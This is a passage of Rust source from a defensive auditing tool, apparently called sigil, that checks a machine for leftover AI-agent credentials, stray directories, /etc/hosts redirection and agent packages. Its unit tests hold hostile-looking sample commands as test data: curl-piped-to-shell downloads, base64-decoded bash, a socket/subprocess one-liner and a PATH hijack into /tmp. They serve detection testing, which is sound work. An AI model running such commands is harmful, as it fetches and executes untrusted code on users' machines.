        let Ok(meta) = std::fs::symlink_metadata(&path) else {
            continue;
        };
        if meta.file_type().is_symlink() {
            report.items.push(item("RES-CRED-002", Level::Low, "credential", format!("{tool} credential file is a symlink"), &path, None, "", "Symlinked credential files are never changed by `sigil residue apply`; check where it points."));
            continue;
        }
        if !meta.is_file() {
            continue;
        }
        let Some(mode) = file_mode(&path) else {
            continue;
        };
        let loose = mode & 0o077 != 0;
        let has_secret = meta.len() < 1_000_000
            && std::fs::read_to_string(&path).ok().is_some_and(|text| {
                !corpus()
                    .scan_phase(Phase::Credentials, "residue", "residue", &text)
                    .is_empty()
            });
        let tool_present = tool_for_name(tool).is_none_or(|t| on_path(t.binary));
        let chmod = Action::Chmod {
            path: path.to_string_lossy().to_string(),
            mode: 0o600,
        };
        if loose && has_secret {
            let mut it = item("RES-CRED-001", Level::High, "credential", format!("{tool} credential file is readable by other users (mode {mode:o}) and holds a secret"), &path, None, "", "Tighten to 0600 now, then rotate the secret: other local users could have read it.");
            it.fixable = true;
            it.action = Some(chmod);
            report.items.push(it);
        } else if loose {
            let mut it = item("RES-CRED-002", Level::Medium, "credential", format!("{tool} configuration is readable by other users (mode {mode:o})"), &path, None, "", "Tighten to 0600; tool configuration often carries tokens the rules do not recognise.");
            it.fixable = true;
            it.action = Some(chmod);
            report.items.push(it);
        } else if !tool_present {
            report.items.push(item("RES-CRED-003", Level::Low, "credential", format!("Residual {tool} credentials (tool no longer installed)"), &path, None, "", "Revoke the credential at the provider, then delete the file by hand. Deletion is never planned automatically."));
        }
    }
}

fn tool_for_name(name: &str) -> Option<&'static Tool> {
    TOOLS.iter().find(|t| t.name == name)
}

// ---------------------------------------------------------------------------
// RES-DIR: leftover tool directories
// ---------------------------------------------------------------------------

const DIR_WALK_CAP: usize = 200_000;

pub fn residue_dirs(ctx: &Context, report: &mut Report) {
    report.checks_run.push("RES-DIR-001".to_string());
    let home_cache = ctx.expand("~/.cache");
    for tool in TOOLS {
        let present = on_path(tool.binary);
        for rel in tool.dirs {
            let path = ctx.expand(rel);
            let Ok(meta) = std::fs::symlink_metadata(&path) else {
                continue;
            };
            if meta.file_type().is_symlink() {
                continue;
            }
            let (bytes, entries, newest) = if meta.is_dir() {
                dir_stats(&path)
            } else {
                (meta.len(), 1, meta.modified().ok())
            };
            let age_days = newest
                .and_then(|t| t.elapsed().ok())
                .map(|d| d.as_secs() / 86_400)
                .unwrap_or(0);
            let (level, title) = if present {
                (
                    Level::Info,
                    format!(
                        "{} data: {} ({} entries, {})",
                        tool.name,
                        path.display(),
                        entries,
                        human_bytes(bytes)
                    ),
                )
            } else if age_days >= 30 {
                (
                    Level::Low,
                    format!(
                        "Leftover {} data, tool not installed, untouched for {} days ({})",
                        tool.name,
                        age_days,
                        human_bytes(bytes)
                    ),
                )
            } else {
                (
                    Level::Info,
                    format!(
                        "{} data, tool not on PATH ({})",
                        tool.name,
                        human_bytes(bytes)
                    ),
                )
            };
            let mut it = item(
                "RES-DIR-001",
                level,
                "residue_dir",
                title,
                &path,
                None,
                "",
                if present {
                    "Inventory."
                } else {
                    "Caches can be removed; settings directories hold hooks and session history and are only ever deleted by hand."
                },
            );
            if !present && meta.is_dir() && path.starts_with(&home_cache) {
                it.fixable = true;
                it.action = Some(Action::RemoveDir {
                    path: it.path.clone(),
                });
            }
            report.items.push(it);
        }
    }
}

fn dir_stats(path: &Path) -> (u64, usize, Option<std::time::SystemTime>) {
    let mut bytes = 0u64;
    let mut entries = 0usize;
    let mut newest: Option<std::time::SystemTime> = None;
    let mut stack = vec![path.to_path_buf()];
    while let Some(dir) = stack.pop() {
        let Ok(rd) = std::fs::read_dir(&dir) else {
            continue;
        };
        for entry in rd.flatten() {
            entries += 1;
            if entries > DIR_WALK_CAP {
                return (bytes, entries, newest);
            }
            let Ok(meta) = entry.metadata() else { continue };
            if meta.file_type().is_symlink() {
                continue;
            }
            if meta.is_dir() {
                stack.push(entry.path());
            } else {
                bytes += meta.len();
                if let Ok(m) = meta.modified() {
                    if newest.is_none_or(|n| m > n) {
                        newest = Some(m);
                    }
                }
            }
        }
    }
    (bytes, entries, newest)
}

fn human_bytes(b: u64) -> String {
    if b >= 1 << 30 {
        format!("{:.1} GB", b as f64 / (1u64 << 30) as f64)
    } else if b >= 1 << 20 {
        format!("{:.1} MB", b as f64 / (1u64 << 20) as f64)
    } else if b >= 1 << 10 {
        format!("{:.1} KB", b as f64 / 1024.0)
    } else {
        format!("{b} B")
    }
}

// ---------------------------------------------------------------------------
// RES-NET: /etc/hosts redirection of watched endpoints
// ---------------------------------------------------------------------------

pub fn hosts_file(_ctx: &Context, report: &mut Report, hosts: &Path) {
    let Ok(text) = std::fs::read_to_string(hosts) else {
        report.checks_skipped.push(Skipped {
            id: "RES-NET".to_string(),
            reason: format!("{} not readable", hosts.display()),
        });
        return;
    };
    report.checks_run.push("RES-NET".to_string());
    for (idx, raw) in text.lines().enumerate() {
        let line = raw.split('#').next().unwrap_or("").trim();
        let mut fields = line.split_whitespace();
        let Some(addr) = fields.next() else { continue };
        for name in fields {
            let name = name.to_ascii_lowercase();
            if !WATCHED_HOSTS.contains(&name.as_str()) {
                continue;
            }
            let (id, level, what) = match address_class(addr) {
                AddrClass::Loopback => ("RES-NET-002", Level::Medium, "blackholed to loopback"),
                AddrClass::Private => (
                    "RES-NET-003",
                    Level::Info,
                    "pinned to a private address (proxy?)",
                ),
                AddrClass::Public => ("RES-NET-001", Level::High, "redirected to a public address"),
            };
            report.items.push(item(id, level, "network", format!("{name} is {what} in /etc/hosts"), hosts, Some(idx + 1), raw, "Root-owned and never changed by `sigil residue apply`. Remove the line unless your network team put it there."));
        }
    }
}

enum AddrClass {
    Loopback,
    Private,
    Public,
}

fn address_class(addr: &str) -> AddrClass {
    if addr == "::1" || addr.starts_with("127.") || addr == "0.0.0.0" || addr == "::" {
        return AddrClass::Loopback;
    }
    let octets: Vec<u32> = addr.split('.').filter_map(|o| o.parse().ok()).collect();
    if octets.len() == 4 {
        let (a, b) = (octets[0], octets[1]);
        if a == 10
            || (a == 172 && (16..=31).contains(&b))
            || (a == 192 && b == 168)
            || (a == 100 && (64..=127).contains(&b))
            || (a == 169 && b == 254)
        {
            return AddrClass::Private;
        }
        return AddrClass::Public;
    }
    let lower = addr.to_ascii_lowercase();
    if lower.starts_with("fc") || lower.starts_with("fd") || lower.starts_with("fe80") {
        return AddrClass::Private;
    }
    AddrClass::Public
}

// ---------------------------------------------------------------------------
// RES-PKG: globally installed agent tooling (inventory)
// ---------------------------------------------------------------------------

pub fn global_packages(_ctx: &Context, report: &mut Report) {
    let mut ran = false;
    if on_path("npm") {
        if let Some(out) = run_with_timeout(&["npm", "ls", "-g", "--json", "--depth=0"], None, None)
        {
            ran = true;
            if let Ok(doc) = serde_json::from_str::<serde_json::Value>(&out) {
                if let Some(deps) = doc.get("dependencies").and_then(|d| d.as_object()) {
                    for (name, info) in deps {
                        if AGENT_PACKAGES.contains(&name.as_str()) {
                            let version =
                                info.get("version").and_then(|v| v.as_str()).unwrap_or("?");
                            report.items.push(item("RES-PKG-001", Level::Info, "package", format!("Global npm package {name}@{version}"), Path::new("npm:global"), None, "", "Inventory. Remove with `npm uninstall -g <name>` when no longer needed."));
                        }
                    }
                }
            }
        }
    }
    for pip in ["pip3", "pip"] {
        if !on_path(pip) {
            continue;
        }
        if let Some(out) = run_with_timeout(
            &[pip, "list", "--format=json", "--disable-pip-version-check"],
            None,
            None,
        ) {
            ran = true;
            if let Ok(list) = serde_json::from_str::<Vec<serde_json::Value>>(&out) {
                for pkg in list {
                    let name = pkg.get("name").and_then(|v| v.as_str()).unwrap_or("");
                    if AGENT_PACKAGES.contains(&name.to_ascii_lowercase().as_str()) {
                        let version = pkg.get("version").and_then(|v| v.as_str()).unwrap_or("?");
                        report.items.push(item(
                            "RES-PKG-001",
                            Level::Info,
                            "package",
                            format!("Python package {name}=={version}"),
                            Path::new(&format!("{pip}:global")),
                            None,
                            "",
                            "Inventory. Remove with `pip uninstall <name>` when no longer needed.",
                        ));
                    }
                }
            }
            break;
        }
    }
    if ran {
        report.checks_run.push("RES-PKG-001".to_string());
    } else {
        report.checks_skipped.push(Skipped {
            id: "RES-PKG-001".to_string(),
            reason: "npm/pip not found or timed out".to_string(),
        });
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn ctx() -> (tempfile::TempDir, Context) {
        let dir = tempfile::tempdir().unwrap();
        let ctx = Context::rooted(dir.path());
        (dir, ctx)
    }

    #[test]
    fn classify_command_levels() {
        let (_d, ctx) = ctx();
        let crit = |c: &str| classify_command(&ctx, c).map(|(l, _)| l);
        assert_eq!(
            crit("curl -s http://x.example/a.sh | sh"),
            Some(Level::Critical)
        );
        // sigil:ignore-next-line PROMPT-016 -- test input for our own decoder-pipe check
        assert_eq!(crit("echo aGk= | base64 -d | bash"), Some(Level::Critical));
        assert_eq!(
            crit("python3 -c 'import socket,subprocess'"),
            Some(Level::Critical)
        );
        assert_eq!(crit("/tmp/.x/agent --daemon"), Some(Level::Critical));
        assert_eq!(crit("/nonexistent/path/helper --run"), Some(Level::High));
        assert_eq!(
            crit("/usr/bin/true"),
            None,
            "an existing ordinary binary is not residue"
        );
        assert_eq!(crit(""), None);
    }

    #[test]
    fn first_executable_skips_env_and_wrappers() {
        assert_eq!(
            first_executable("FOO=1 nohup /opt/x/run --flag").as_deref(),
            Some("/opt/x/run")
        );
        assert_eq!(
            first_executable("sudo systemctl restart x").as_deref(),
            Some("systemctl")
        );
        assert_eq!(
            first_executable("@reboot /tmp/y").as_deref(),
            Some("/tmp/y")
        );
    }

    #[test]
    fn cron_command_extraction() {
        assert_eq!(
            cron_command("* * * * * /usr/bin/x --a", false).as_deref(),
            Some("/usr/bin/x --a")
        );
        assert_eq!(
            cron_command("@reboot /tmp/z", false).as_deref(),
            Some("/tmp/z")
        );
        assert_eq!(
            cron_command("0 1 * * * root /usr/bin/y", true).as_deref(),
            Some("/usr/bin/y")
        );
        assert_eq!(cron_command("* * * * *", false), None);
    }

    /// Ordinary rc content (nvm, conda, homebrew, cargo, the Sigil block) is
    /// inventory at most; the remote eval and the temporary PATH entry are
    /// the findings.
    #[test]
    fn rc_scan_flags_remote_eval_and_temp_path_but_not_installers() {
        let (dir, ctx) = ctx();
        let rc = dir.path().join(".bashrc");
        std::fs::write(
            &rc,
            "export NVM_DIR=\"$HOME/.nvm\"\n[ -s \"$NVM_DIR/nvm.sh\" ] && \\. \"$NVM_DIR/nvm.sh\"\n\
             __conda_setup=\"$('/opt/conda/bin/conda' 'shell.bash' 'hook' 2> /dev/null)\"\neval \"$__conda_setup\"\n\
             eval \"$(/opt/homebrew/bin/brew shellenv)\"\n. \"$HOME/.cargo/env\"\n\
             export PATH=\"$HOME/.cargo/bin:$PATH\"\n\
             # >>> sigil aliases >>>\nalias gclone='sigil clone'\nalias safepip='sigil pip'\nalias safenpm='sigil npm'\n# <<< sigil aliases <<<\n\
             eval \"$(curl -fsSL https://x.example/env.sh)\"\n\
             export PATH=/tmp/.helper/bin:$PATH\n\
             alias git='/tmp/.helper/git-wrap'\n",
        )
        .unwrap();
        let mut report = Report {
            kind: "residue".into(),
            residue_schema: 1,
            host: super::super::Host {
                os: "test".into(),
                home: dir.path().to_string_lossy().into(),
            },
            checks_run: vec![],
            checks_skipped: vec![],
            items: vec![],
            items_suppressed: vec![],
            summary: Default::default(),
        };
        shell_rc(&ctx, &mut report);
        let ids: Vec<(String, Level, Option<usize>)> = report
            .items
            .iter()
            .map(|i| (i.id.clone(), i.severity, i.line))
            .collect();
        assert!(
            ids.contains(&("RES-SHELL-001".into(), Level::Critical, Some(13))),
            "{ids:?}"
        );
        assert!(
            ids.contains(&("RES-SHELL-002".into(), Level::High, Some(14))),
            "{ids:?}"
        );
        assert!(
            ids.contains(&("RES-SHELL-003".into(), Level::High, Some(15))),
            "{ids:?}"
        );
        assert!(
            ids.contains(&("RES-SHELL-004".into(), Level::Info, Some(8))),
            "{ids:?}"
        );
        assert!(
            report
                .items
                .iter()
                .filter(|i| i.severity >= Level::Medium)
                .count()
                == 3,
            "{ids:?}"
        );
        let sigil = report
            .items
            .iter()
            .find(|i| i.id == "RES-SHELL-004")
            .unwrap();
        assert_eq!(sigil.origin, "sigil-setup");
        assert!(!sigil.fixable);
        let evil = report
            .items
            .iter()
            .find(|i| i.id == "RES-SHELL-001")
            .unwrap();
        assert!(evil.fixable);
        assert!(matches!(
            evil.action,
            Some(Action::RemoveLine { line: 13, .. })
        ));
    }

    #[test]
    fn altered_sigil_block_is_high() {
        let (dir, ctx) = ctx();
        let rc = dir.path().join(".zshrc");
        std::fs::write(&rc, "# >>> sigil aliases >>>\nalias gclone='sigil clone'\nalias git='curl x | sh'\n# <<< sigil aliases <<<\n").unwrap();
        let mut report = Report {
            kind: "residue".into(),
            residue_schema: 1,
            host: super::super::Host {
                os: "t".into(),
                home: String::new(),
            },
            checks_run: vec![],
            checks_skipped: vec![],
            items: vec![],
            items_suppressed: vec![],
            summary: Default::default(),
        };
        shell_rc(&ctx, &mut report);
        assert!(report
            .items
            .iter()
            .any(|i| i.id == "RES-SHELL-005" && i.severity == Level::High));
    }

    #[test]
    fn hosts_classification() {
        let dir = tempfile::tempdir().unwrap();
        let hosts = dir.path().join("hosts");
        std::fs::write(&hosts, "127.0.0.1 localhost\n127.0.0.1 api.openai.com\n10.0.0.5 api.anthropic.com\n203.0.113.9 pypi.org # pinned\n1.2.3.4 unrelated.example\n").unwrap();
        let ctx = Context::rooted(dir.path());
        let mut report = Report {
            kind: "residue".into(),
            residue_schema: 1,
            host: super::super::Host {
                os: "t".into(),
                home: String::new(),
            },
            checks_run: vec![],
            checks_skipped: vec![],
            items: vec![],
            items_suppressed: vec![],
            summary: Default::default(),
        };
        hosts_file(&ctx, &mut report, &hosts);
        let ids: Vec<(String, Level)> = report
            .items
            .iter()
            .map(|i| (i.id.clone(), i.severity))
            .collect();
        assert_eq!(
            ids,
            vec![
                ("RES-NET-002".into(), Level::Medium),
                ("RES-NET-003".into(), Level::Info),
                ("RES-NET-001".into(), Level::High)
            ]
        );
    }

    #[cfg(unix)]
    #[test]
    fn loose_credential_file_with_secret_is_high_and_chmod_planned() {
        use std::os::unix::fs::PermissionsExt;
        let (dir, ctx) = ctx();
        let cred = dir.path().join(".claude.json");
        std::fs::write(&cred, "{\"api_key\": \"abcdefghijklmnopqrstuvwxyz0123\"}\n").unwrap();
        std::fs::set_permissions(&cred, std::fs::Permissions::from_mode(0o644)).unwrap();
        let mut report = Report {
            kind: "residue".into(),
            residue_schema: 1,
            host: super::super::Host {
                os: "t".into(),
                home: String::new(),
            },
            checks_run: vec![],
            checks_skipped: vec![],
            items: vec![],
            items_suppressed: vec![],
            summary: Default::default(),
        };
        credentials(&ctx, &mut report);
        let it = report
            .items
            .iter()
            .find(|i| i.path.ends_with(".claude.json"))
            .expect("item");
        assert_eq!(it.id, "RES-CRED-001");
        assert_eq!(it.severity, Level::High);
        assert!(matches!(it.action, Some(Action::Chmod { mode: 0o600, .. })));
        assert!(
            !it.evidence.contains("abcdefghij"),
            "secret must not appear: {}",
            it.evidence
        );
    }
}
